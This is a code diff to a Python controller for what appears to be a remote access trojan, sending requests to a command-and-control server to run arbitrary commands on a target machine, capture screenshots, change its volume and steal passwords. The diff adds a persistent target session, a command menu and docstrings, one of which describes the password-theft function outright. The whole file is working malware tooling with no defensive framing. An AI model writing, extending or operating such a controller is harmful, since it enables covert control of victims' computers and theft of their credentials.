@@ -13,41 +13,83 @@ LAST_TARGET = ""
 current_directory = os.path.dirname(os.path.abspath(__file__))
 users_directory = os.path.join(current_directory, 'Users', "User.json")
 
+target_session = input("Enter Target Here: ")
+
 class CommandClass:
     def __init__(self, command: str) -> None:
         self.command = command
         self.data = os.path.join(os.getcwd(), 'data')
+        self.menu()
         
         self.commands = {
-            'exec': self.execute_command,
-            'ss': self.take_screenshot,
-            'password': self.steal_passwords
+            'exec': (self.execute_command, self.execute_command.__doc__),
+            'ss': (self.take_screenshot, self.take_screenshot.__doc__),
+            'password': (self.steal_passwords, self.steal_passwords.__doc__),
+            'volume': (self.change_volume, self.change_volume.__doc__),
+            'menu': (self.menu, self.menu.__doc__),
         }
         
     def execute_command(self):
+        """
+            Execute a command on the target machine.
+            Prompts for target and command, then sends a request to execute the command\n
+        """
         global LAST_TARGET
-        target = input("Enter Target Here: ")
+        target = target_session # input("Enter Target Here: ")
+        command = input("Enter Command Here: ")
         print(f"Executing command: {self.command}")
         print("Please wait a few seconds")
-        command_to_execute = self.command.split(' ', 1)[1]
         try:
-            response = requests.get(f"{URL}/exec?target={target}&command={command_to_execute}&response=nil_")
+            response = requests.get(f"{URL}/exec?target={target}&command={command}&response=nil_")
             LAST_TARGET = target
         except Exception as e:
             print(e)
 
     def take_screenshot(self):
+        """
+        Take a screenshot of the target machine.
+        Prompts for target and sends a request to capture the screenshot.\n
+        """
         global LAST_TARGET
         try:
-            target = input("Enter Target Here: ")
+            target = target_session # input("Enter Target Here: ")
             response = requests.post(f"{URL}/ss?target={target}&state=true", json={"imgdata": "nil_"})
             LAST_TARGET = target
         except Exception as e:
             print(e)
             
-    def steal_passwords(self):
+    def change_volume(self):
+        """
+        Change the volume of the set target.
+        Prompts for target and volume percentage, then sends a request to adjust the volume.\n
+        """
         global LAST_TARGET
-        target = input("Enter Target Here: ")
+        try:
+            target = target_session # input("Enter Target Here: ")
+            volume = input("Enter Volume percent (0-100): ")
+            response = requests.get(f"{URL}/volume?target={target}&percent={volume}")
+            LAST_TARGET = target
+        except Exception as e:
+            print(e)
+            
+    def menu(self):
+        """
+        Display a menu of available commands with descriptions.
+        Lists all commands and what they do.\n
+        """
+        try:
+            for command, (func, description) in self.commands.items():
+                print(f"{command}: {description.strip() if description else 'No description available'} \n")
+        except Exception as e:
+            pass
+            
+    def steal_passwords(self):
+        """
+        Attempt to steal passwords from the target machine.
+        Prompts for target and sends a request to retrieve passwords.\n
+        """
+        global LAST_TARGET
+        target = target_session # input("Enter Target Here: ")
         print("Please wait a few seconds")
         try:
             response = requests.get(f"{URL}/passwords?target={target}&state=true&passwords=[]")
@@ -56,11 +98,26 @@ class CommandClass:
             print(e)
 
     def execute(self):
-        command_name = self.command.split()[0]
-        if command_name in self.commands:
-            self.commands[command_name]()
-        else:
-            print(f"Unknown command: {command_name}")
+        """
+            Execute a command based on the command string.
+            Parses the command, calls the corresponding function, and handles errors.
+        """
+        try:
+            parts = self.command.split()
+            command_name = parts[0]
+            if command_name in self.commands:
+                func, description = self.commands[command_name]
+                if len(parts) > 1:
+                    # Extract arguments if available
+                    args = parts[1:]
+                    func(*args)  # Call the command function with arguments
+                else:
+                    func()  # Call the command function without arguments
+            else:
+                print(f"Unknown command: {command_name}")
+                self.menu()
+        except Exception as e:
+            print(f"An error occurred: {e} dsadaadasa")
             
 def get_user_data():
     with open(users_directory, "r") as file:
